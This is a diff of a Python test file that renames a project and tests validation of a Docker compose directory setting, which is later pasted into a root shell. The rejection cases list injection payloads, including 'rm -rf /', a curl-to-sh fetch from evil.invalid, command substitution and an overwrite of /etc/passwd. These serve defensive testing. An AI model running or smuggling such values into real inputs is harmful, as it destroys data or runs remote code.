@@ -1,6 +1,6 @@
 """``docker_compose_dir`` validation (#2664, reporter pchulpjoost).
 
-This setting is not consumed by Bambuddy at all — it is interpolated into a
+This setting is not consumed by Fenrir at all — it is interpolated into a
 shell command that the Settings page invites the user to copy and paste into a
 root-capable terminal. That inverts the usual threat model for a string
 setting: the danger is not what the server does with the value, it is what the
@@ -19,11 +19,11 @@ class TestComposeDirValidation:
     @pytest.mark.parametrize(
         "value",
         [
-            "/opt/bambuddy",
+            "/opt/fenrir",
             "/srv/stacks/bambu buddy",  # spaces are legal; the frontend quotes them
-            "C:\\Users\\martin\\bambuddy",
-            "~/bambuddy",
-            "/home/martin/3D-Druck/bambuddy",  # non-ASCII path components
+            "C:\\Users\\martin\\fenrir",
+            "~/fenrir",
+            "/home/martin/3D-Druck/fenrir",  # non-ASCII path components
             "",
         ],
     )
@@ -33,13 +33,13 @@ class TestComposeDirValidation:
     @pytest.mark.parametrize(
         "value",
         [
-            "/opt/bambuddy; rm -rf /",
-            "/opt/bambuddy && curl evil.invalid/x | sh",
-            "/opt/bambuddy`id`",
-            "/opt/bambuddy$(id)",
-            "/opt/bambuddy | tee /etc/passwd",
-            '/opt/bambuddy" && echo pwned && echo "',
-            "/opt/bambuddy\nrm -rf /",
+            "/opt/fenrir; rm -rf /",
+            "/opt/fenrir && curl evil.invalid/x | sh",
+            "/opt/fenrir`id`",
+            "/opt/fenrir$(id)",
+            "/opt/fenrir | tee /etc/passwd",
+            '/opt/fenrir" && echo pwned && echo "',
+            "/opt/fenrir\nrm -rf /",
         ],
     )
     def test_rejects_shell_metacharacters(self, value: str):
@@ -72,6 +72,6 @@ class TestComposeDirValidation:
             AppSettingsUpdate(docker_compose_dir="C:\\bam buddy\\")
 
     def test_windows_path_without_trailing_separator_survives(self):
-        assert AppSettingsUpdate(docker_compose_dir="C:\\Users\\martin\\bambuddy").docker_compose_dir == (
-            "C:\\Users\\martin\\bambuddy"
+        assert AppSettingsUpdate(docker_compose_dir="C:\\Users\\martin\\fenrir").docker_compose_dir == (
+            "C:\\Users\\martin\\fenrir"
         )
